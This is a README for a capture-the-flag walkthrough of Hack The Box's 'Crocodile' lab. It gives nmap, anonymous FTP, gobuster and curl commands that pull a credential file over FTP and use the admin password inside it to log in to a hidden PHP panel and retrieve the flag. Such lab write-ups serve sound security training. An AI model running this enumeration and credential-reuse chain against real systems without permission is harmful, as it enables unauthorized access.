# HTB “Crocodile” Exploit Walkthrough

Chain an anonymous FTP credential leak into a hidden PHP login panel to retrieve the flag on HTB’s Crocodile box.

## Quick Start

```bash
git clone https://github.com/keyfive5/obsidiansignal-htb-crocodile.git
cd obsidiansignal-htb-crocodile
bash scripts/enum-crocodile.sh <TARGET_IP>
```

## Prerequisites

- **ftp** client  
- **gobuster**  
- **curl**  
- **Bash** shell  
- HTB VPN connection  

## Repository Structure

```
obsidiansignal-htb-crocodile/
├── README.md
├── writeup/
│   ├── lab-writeup.md
│   └── lab-report.pdf
├── scripts/
│   └── enum-crocodile.sh
├── screenshots/
│   ├── nmap-ftp-http.png
│   ├── ftp-anon.png
│   ├── gobuster-login.png
│   └── admin-flag.png
└── articles/
    └── crocodile-devto.md
```

## Lab Steps

1. **FTP Enumeration**  
   ```bash
   nmap -sC -sV -p21,80 <IP>
   ftp <IP>  
   # login: anonymous
   dir
   get allowed.userlist
   get allowed.userlist.passwd
   ```
2. **Extract Credentials**  
   ```bash
   cat allowed.userlist
   cat allowed.userlist.passwd
   # e.g. admin / Supersecretpassword1
   ```
3. **Discover Hidden Pages**  
   ```bash
   gobuster dir      --url http://<IP>/      --wordlist /usr/share/wordlists/dirb/common.txt      -x php,html      -o screenshots/gobuster-login.txt
   ```
4. **Admin Login & Flag Retrieval**  
   ```bash
   curl -d "username=admin&password=Supersecretpassword1"         http://<IP>/login.php -o screenshots/admin-flag.html
   ```
   View `screenshots/admin-flag.png` for the captured flag.

## Flag

The flag is displayed at the top of the admin panel upon successful login.

## Automation Script

See `scripts/enum-crocodile.sh` for a fully automated enumeration.

## Screenshots

- **nmap-ftp-http.png** – Nmap output showing FTP (21) and HTTP (80) open.  
- **ftp-anon.png** – Demonstration of anonymous FTP login and file download.  
- **gobuster-login.png** – Gobuster discovering `login.php`.  
- **admin-flag.png** – Admin panel screenshot with flag visible.

---

*Happy hacking!*  
